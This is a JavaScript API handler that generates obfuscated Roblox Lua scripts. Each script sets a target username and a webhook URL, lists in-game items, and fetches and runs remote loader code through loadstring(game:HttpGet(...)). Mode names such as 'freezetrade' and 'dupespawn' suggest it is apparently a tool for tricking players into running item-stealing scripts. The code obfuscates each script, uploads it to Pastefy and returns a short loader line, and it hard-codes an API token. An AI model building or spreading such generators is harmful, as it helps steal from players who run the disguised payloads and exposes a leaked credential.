// api/generate.js
const fetch = require('node-fetch');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled } = req.body;

    if (!username) {
        return res.status(400).json({ error: 'Username is required' });
    }

    try {
        // 1. Construir el script base
        const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || [], customCode || '');

        // 2. Si shortEnabled está activado, ofuscar y subir a Pastefy
        if (shortEnabled) {
            try {
                // Ofuscar con WeAreDevs
                const obfuscatedScript = await obfuscateWithWeAreDevs(script);
                
                // Subir a Pastefy
                const pastefyUrl = await createPastefyPaste(obfuscatedScript);
                
                // Devolver el loadstring corto
                return res.status(200).json({
                    loadstring: `loadstring(game:HttpGet("${pastefyUrl}"))()`,
                    script: obfuscatedScript
                });
            } catch (error) {
                console.error('Error en ofuscación/Pastefy:', error);
                // Si falla, devolver el script sin ofuscar
                return res.status(200).json({ script });
            }
        }

        // 3. Si no se ofusca, devolver el script normal
        return res.status(200).json({ script });

    } catch (error) {
        return res.status(500).json({ error: error.message });
    }
}

// ============================================================
//  CONSTRUIR SCRIPT
// ============================================================
function buildScript(username, webhook, mode, brainrots, skins, gears, customCode) {
    function luaTable(arr, indent = '    ') {
        if (arr.length === 0) return '{}';
        const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
        return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
    }

    let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
    script += `getgenv().WEBHOOK_URL = "${webhook ? webhook.replace(/"/g, '\\"') : 'WEBHOOK_URL'}"\n`;
    script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
    script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
    script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;

    const guiLoadstrings = {
        adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
        freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
        dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
    };

    let fullScript = `-- Mode: ${mode.toUpperCase()}\n` + script;

    if (mode === 'normal') {
        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
    } else if (mode in guiLoadstrings) {
        fullScript += `
task.spawn(function()
    ${guiLoadstrings[mode]}
end)`;
    } else if (mode === 'custom') {
        fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
        if (customCode && customCode.trim()) {
            fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
        }
    }

    return fullScript;
}

// ============================================================
//  OFUSCAR CON WEAREDEVS
// ============================================================
async function obfuscateWithWeAreDevs(script) {
    const response = await fetch('https://wearedevs.net/api/obfuscate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ script: script })
    });

    if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
    }

    const data = await response.json();

    if (!data.success) {
        throw new Error(data.error || 'WeAreDevs devolvió success: false');
    }

    const obfuscated = data.obfuscated;
    if (!obfuscated) {
        throw new Error(`No se pudo obtener el script ofuscado.`);
    }
    return obfuscated;
}

// ============================================================
//  SUBIR A PASTEFY
// ============================================================
async function createPastefyPaste(content) {
    const PASTEFY_API_TOKEN = process.env.PASTEFY_API_TOKEN || '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
    const url = 'https://pastefy.app/api/v2/paste';
    const payload = {
        content: content,
        title: 'OBLIVION Script',
        syntax: 'lua',
        expires: 'never'
    };

    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${PASTEFY_API_TOKEN}`
        },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Pastefy error (${response.status}): ${errorText}`);
    }

    const result = await response.json();

    let pasteId = null;
    if (result.paste && result.paste.id) {
        pasteId = result.paste.id;
    } else if (result.id) {
        pasteId = result.id;
    } else if (result._id) {
        pasteId = result._id;
    } else if (result.pasteId) {
        pasteId = result.pasteId;
    }

    if (!pasteId) {
        throw new Error(`No se pudo obtener el ID del paste. Respuesta: ${JSON.stringify(result)}`);
    }

    return `https://pastefy.app/${pasteId}/raw`;
}
